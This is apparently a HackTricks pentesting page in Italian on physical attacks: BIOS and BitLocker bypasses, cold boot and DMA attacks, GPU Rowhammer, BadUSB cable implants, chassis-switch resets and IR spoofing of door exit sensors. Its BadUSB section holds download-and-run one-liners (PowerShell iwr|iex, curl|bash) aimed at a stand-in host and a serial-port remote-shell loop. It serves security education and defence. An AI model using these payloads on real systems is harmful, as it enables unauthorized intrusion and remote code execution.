# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS** può essere fatto in diversi modi. La maggior parte delle schede madri include una **battery** che, se rimossa per circa **30 minuti**, reimposta le impostazioni del BIOS, inclusa la password. In alternativa, un **jumper sulla motherboard** può essere regolato per reimpostare queste impostazioni collegando specifici pin.

Per situazioni in cui le modifiche hardware non sono possibili o pratiche, gli **software tools** offrono una soluzione. Avviare un sistema da un **Live CD/USB** con distribuzioni come **Kali Linux** fornisce accesso a tools come **_killCmos_** e **_CmosPWD_**, che possono aiutare nel BIOS password recovery.

Nei casi in cui la BIOS password è sconosciuta, inserirla in modo errato **tre volte** di solito genera un error code. Questo codice può essere usato su siti come [https://bios-pw.org](https://bios-pw.org) per recuperare potenzialmente una password utilizzabile.

### UEFI Security

Per i sistemi moderni che usano **UEFI** invece del BIOS tradizionale, il tool **chipsec** può essere utilizzato per analizzare e modificare le impostazioni UEFI, incluso il disabling di **Secure Boot**. Questo può essere fatto con il seguente comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analisi della RAM e attacchi Cold Boot

La RAM trattiene i dati per poco tempo dopo il distacco dell’alimentazione, di solito per **1 to 2 minutes**. Questa persistenza può essere estesa a **10 minutes** applicando sostanze fredde, come l’azoto liquido. Durante questo periodo esteso, si può creare un **memory dump** usando strumenti come **dd.exe** e **volatility** per l’analisi.

---

## GPU Rowhammer contro le Page Table

I moderni attacchi GPU Rowhammer diventano molto più utili quando prendono di mira i **GPU virtual-memory metadata** invece dei buffer ordinari. Ricerche recenti su **GDDR6 NVIDIA Ampere GPUs** mostrano che un attacker che esegue codice CUDA non privilegiato può costruire pattern di hammering specifici per GPU, usare **memory massaging** per collocare le paging structures in righe vulnerabili e poi fare bit flip nella **last-level page table** o in una **page directory** intermedia. Una volta corrotta una singola entry di traduzione, l'attacker può avviare **arbitrary GPU memory read/write** e poi pivotare verso la compromissione dell'host.

### Pattern di exploitation

1. **Profile hammerable rows** in GDDR6 e costruisci pattern di hammering refresh-aware / non-uniform che aggirano le mitigazioni in-DRAM.
2. **Massage GPU allocations** in modo che il driver collochi le page-translation structures in posizioni fisiche hammerable invece di tenerle nel pool protetto predefinito. In pratica questo può significare esaurire la regione di page-table a bassa memoria e fare spraying di grandi mapping UVM sparsi con stride controllati.
3. **Flip translation metadata** come **PFN** o bit relativi all'aperture all'interno di una entry di page-table / page-directory, così che la virtual page controllata dall'attacker venga risolta in pagine di page-table, memoria GPU arbitraria o mapping di sistema visibili dall'host.
4. Riutilizza il mapping falsificato per riscrivere ulteriori entry di traduzione ed elevare a **arbitrary GPU memory read/write** attraverso i contesti GPU.

### Pivot verso l'host e mitigazioni

- Con **IOMMU disabled**, mapping di system-aperture falsificati possono esporre memoria fisica arbitraria dell'host alla GPU, trasformando la primitive GPU in una compromissione completa dell'host.
- **GDDRHammer** prende di mira le entry della last-level page-table, mentre **GeForge** mostra che corrompere un livello di page-directory può essere più facile perché un singolo bit flip può reindirizzare un sottoalbero di traduzione più grande. Non considerare solo un livello di paging come critico per la sicurezza.
- **IOMMU** resta importante perché blocca il percorso diretto verso arbitrary-host-memory usato da GDDRHammer/GeForge, ma **non è una mitigazione completa**. **GPUBreach** mostra un pivot di seconda fase in cui l'attacker corrompe buffer CPU scrivibili dalla GPU e di proprietà del driver, poi attiva bug di memory-safety del driver NVIDIA per ottenere una primitive di scrittura nel kernel e una **root shell** anche con IOMMU abilitato.
- **System-level ECC** è una misura pratica di hardening sui GPU workstation/server supportati. Le GPU consumer senza ECC espongono una superficie di difesa più debole.
- Questi attacchi non sono puramente teorici: **GeForge** ha riportato **1,171** bit flip su una RTX 3060 e **202** su una RTX A6000, sufficienti per costruire una catena funzionante di privilege escalation sull'host.

---

## Attacchi Direct Memory Access (DMA)

**INCEPTION** è uno strumento progettato per la **physical memory manipulation** tramite DMA, compatibile con interfacce come **FireWire** e **Thunderbolt**. Consente di bypassare le procedure di login patchando la memoria per accettare qualsiasi password. Tuttavia, è inefficace contro sistemi **Windows 10**.

---

## Live CD/USB per l'accesso al sistema

Sostituire binari di sistema come **_sethc.exe_** o **_Utilman.exe_** con una copia di **_cmd.exe_** può fornire un prompt dei comandi con privilegi di sistema. Strumenti come **chntpw** possono essere usati per modificare il file **SAM** di un'installazione Windows, consentendo il cambio delle password.

**Kon-Boot** è uno strumento che facilita l'accesso a sistemi Windows senza conoscere la password, modificando temporaneamente il kernel Windows o UEFI. Maggiori informazioni si trovano su [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di boot e recovery

- **Supr**: Accedi alle impostazioni BIOS.
- **F8**: Entra in modalità Recovery.
- Premere **Shift** dopo il banner di Windows può bypassare l'autologon.

### Dispositivi BAD USB

Dispositivi come **Rubber Ducky** e **Teensyduino** fungono da piattaforme per creare dispositivi **bad USB**, capaci di eseguire payload predefiniti quando vengono collegati a un computer target.

### Volume Shadow Copy

I privilegi di amministratore consentono di creare copie di file sensibili, incluso il file **SAM**, tramite PowerShell.

## Tecniche BadUSB / HID Implant

### Wi-Fi managed cable implants

- Implant basati su ESP32-S3 come **Evil Crow Cable Wind** si nascondono dentro cavi USB-A→USB-C o USB-C↔USB-C, si enumerano solo come tastiera USB ed espongono il loro stack C2 via Wi-Fi. L'operatore deve solo alimentare il cavo dall'host vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con password `123456789` e aprire [http://cable-wind.local/](http://cable-wind.local/) (o il suo indirizzo DHCP) per raggiungere l'interfaccia HTTP embedded.
- La UI del browser fornisce schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload salvati sono etichettati per OS, i layout di tastiera vengono cambiati al volo e le stringhe VID/PID possono essere alterate per imitare periferiche note.
- Poiché il C2 vive dentro il cavo, un telefono può preparare payload, attivare l'esecuzione e gestire le credenziali Wi-Fi senza toccare l'OS host—ideale per intrusioni fisiche di breve durata.

### Payload AutoExec consapevoli dell'OS

- Le regole AutoExec associano uno o più payload da eseguire subito dopo l'enumerazione USB. L'implant esegue un leggero OS fingerprinting e seleziona lo script corrispondente.
- Flusso di esempio:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è non presidiata, basta sostituire un cavo di ricarica per ottenere accesso iniziale “plug-and-pwn” nel contesto dell'utente autenticato.

### Remote shell over Wi-Fi TCP bootstrapppata via HID

1. **Keystroke bootstrap:** Un payload salvato apre una console e incolla un loop che esegue tutto ciò che arriva sul nuovo dispositivo seriale USB. Una variante minima per Windows è:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L'impianto mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia un client TCP (script Python, APK Android o eseguibile desktop) verso l'operatore. Qualsiasi byte digitato nella sessione TCP viene inoltrato nel loop seriale sopra, consentendo l'esecuzione di comandi remoti anche su host air-gapped. L'output è limitato, quindi gli operatori in genere eseguono comandi blind (creazione di account, staging di ulteriore tooling, ecc.).

### HTTP OTA update surface

- Lo stesso web stack di solito espone aggiornamenti firmware non autenticati. Evil Crow Cable Wind ascolta su `/update` e flasha qualsiasi binary venga caricato:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Gli operatori sul campo possono hot-swapare funzionalità (ad es., flashare il firmware USB Army Knife) a metà operazione senza scollegare il cavo, permettendo all'implant di passare a nuove capacità mentre è ancora collegato all'host bersaglio.

## Bypassing BitLocker Encryption

La cifratura BitLocker può essere potenzialmente bypassata se la **recovery password** viene trovata all'interno di un file dump della memoria (**MEMORY.DMP**). Strumenti come **Elcomsoft Forensic Disk Decryptor** o **Passware Kit Forensic** possono essere utilizzati per questo scopo.

---

## Social Engineering per l'aggiunta della Recovery Key

Una nuova recovery key di BitLocker può essere aggiunta tramite tecniche di social engineering, convincendo un utente a eseguire un comando che aggiunge una nuova recovery key composta da zeri, semplificando così il processo di decrittazione.

---

## Sfruttare gli chassis intrusion / maintenance switches per fare factory-reset del BIOS

Molti laptop moderni e desktop small-form-factor includono un **chassis-intrusion switch** monitorato dall'Embedded Controller (EC) e dal firmware BIOS/UEFI.  Sebbene lo scopo principale dello switch sia generare un alert quando un dispositivo viene aperto, i vendor a volte implementano una **undocumented recovery shortcut** che viene attivata quando lo switch viene togglato secondo uno schema specifico.

### Come funziona l'attacco

1. Lo switch è cablato a un **GPIO interrupt** sull'EC.
2. Il firmware in esecuzione sull'EC tiene traccia del **timing and number of presses**.
3. Quando viene riconosciuto un pattern hard-coded, l'EC invoca una routine di *mainboard-reset* che **cancella il contenuto del system NVRAM/CMOS**.
4. Al successivo boot, il BIOS carica i valori di default – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Una volta che Secure Boot è disabilitato e la firmware password è sparita, l'attaccante può semplicemente avviare qualsiasi immagine OS esterna e ottenere accesso illimitato alle unità interne.

### Esempio reale – Framework 13 Laptop

La recovery shortcut per il Framework 13 (11th/12th/13th-gen) è:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Dopo il decimo ciclo l'EC imposta un flag che indica al BIOS di cancellare la NVRAM al successivo riavvio. L'intera procedura richiede ~40 s e non necessita di **altro che un cacciavite**.

### Generic Exploitation Procedure

1. Accendi o sospendi/riprendi il target in modo che l'EC sia in esecuzione.
2. Rimuovi il coperchio inferiore per esporre l'interruttore di intrusione/manutenzione.
3. Riproduci il pattern di toggle specifico del vendor (consulta la documentazione, i forum o fai reverse-engineer del firmware dell'EC).
4. Rimonta e riavvia – le protezioni del firmware dovrebbero essere disabilitate.
5. Avvia una live USB (ad es. Kali Linux) ed esegui il normale post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, ecc.).

### Detection & Mitigation

* Registra gli eventi di intrusion nel chassis nella console di gestione dell'OS e correlali con reset BIOS inattesi.
* Usa **tamper-evident seals** su viti/coperchi per rilevare aperture.
* Tieni i dispositivi in **aree fisicamente controllate**; considera l'accesso fisico equivalente a un compromesso totale.
* Dove disponibile, disabilita la funzionalità del vendor “maintenance switch reset” o richiedi un'ulteriore autorizzazione crittografica per i reset della NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- I sensori commerciali “wave-to-exit” abbinano un emettitore LED near-IR a un modulo ricevitore in stile telecomando TV che riporta logic high solo dopo aver visto più impulsi (~4–10) del carrier corretto (≈30 kHz).
- Una copertura in plastica impedisce a emettitore e ricevitore di vedersi direttamente, quindi il controller presume che qualsiasi carrier validato provenga da una riflessione vicina e attiva un relay che apre la door strike.
- Una volta che il controller crede che sia presente un target spesso modifica l'envelope di modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst che corrisponda al carrier filtrato.

### Attack Workflow
1. **Cattura il profilo di emissione** – collega un logic analyser ai pin del controller per registrare sia le waveform pre-detection sia quelle post-detection che pilotano il LED IR interno.
2. **Riproduci solo la waveform “post-detection”** – rimuovi/ignora l'emettitore stock e pilota un LED IR esterno con il pattern già attivato fin dall'inizio. Poiché il ricevitore si interessa solo al numero di impulsi/frequenza, tratta il carrier spoofato come una riflessione genuina e asserisce la linea del relay.
3. **Gating della trasmissione** – trasmetti il carrier in burst calibrati (ad es. decine di millisecondi on, intervalli off simili) per inviare il numero minimo di impulsi senza saturare l'AGC del ricevitore o la logica di gestione delle interferenze. Un'emissione continua desensibilizza rapidamente il sensore e impedisce al relay di attivarsi.

### Long-Range Reflective Injection
- Sostituire il LED da banco con un diodo IR ad alta potenza, un driver MOSFET e ottiche di focalizzazione consente un triggering affidabile da ~6 m di distanza.
- L'attaccante non ha bisogno di line-of-sight con l'apertura del ricevitore; puntare il fascio verso pareti interne, scaffalature o telai delle porte visibili attraverso il vetro permette all'energia riflessa di entrare nel campo visivo di ~30° e mimare un wave della mano da breve distanza.
- Poiché i ricevitori si aspettano solo riflessioni deboli, un fascio esterno molto più forte può rimbalzare su più superfici e restare comunque sopra la soglia di detection.

### Weaponised Attack Torch
- Integrare il driver in una torcia commerciale nasconde lo strumento in bella vista. Sostituisci il LED visibile con un LED IR ad alta potenza tarato sulla banda del ricevitore, aggiungi un ATtiny412 (o simile) per generare burst ≈30 kHz, e usa un MOSFET per assorbire la corrente del LED.
- Una lente zoom telescopica restringe il fascio per portata/precisione, mentre un motore di vibrazione sotto il controllo della MCU fornisce conferma aptica che la modulazione è attiva senza emettere luce visibile.
- Ciclando tra diversi modulation patterns memorizzati (frequenze e envelope del carrier leggermente diverse) aumenta la compatibilità tra famiglie di sensori rebrandizzate, consentendo all'operatore di passare sulle superfici riflettenti finché il relay scatta udibilmente e la porta si sblocca.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
